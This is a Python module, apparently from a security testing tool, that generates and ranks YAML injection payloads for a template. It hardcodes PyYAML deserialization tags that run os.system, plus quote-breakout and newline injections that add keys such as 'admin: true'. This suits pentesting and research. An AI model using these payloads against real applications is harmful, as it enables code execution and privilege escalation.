"""YAML injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_yaml_context

_PLAIN_BODIES = [
    ("!!python/object/apply:os.system ['id']", "deserialization"),
    ("!!python/object/new:type []", "deserialization-type"),
    ("\nadmin: true", "new-key"),
    ("\nrole: superuser", "new-key"),
]

_QUOTED_BODIES = {
    Context.YAML_SINGLE: [
        ("' \n admin: true", "close-and-key"),
        ("' \n !!python/object/apply:os.system ['id']", "close-and-tag"),
    ],
    Context.YAML_DOUBLE: [
        ('" \n admin: true', "close-and-key"),
        ('" \n !!python/object/apply:os.system ["id"]', "close-and-tag"),
    ],
}

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class YamlCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class YamlMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[YamlCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def mutate_yaml(template: str) -> YamlMutationResult:
    """Generate and rank YAML injection payloads for ``template``."""
    from .analyzer import analyze_yaml

    context = analyze_yaml_context(template)
    generated = _QUOTED_BODIES.get(context, _PLAIN_BODIES)

    candidates: list[YamlCandidate] = []
    for payload, strategy in generated:
        result = analyze_yaml(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                YamlCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return YamlMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
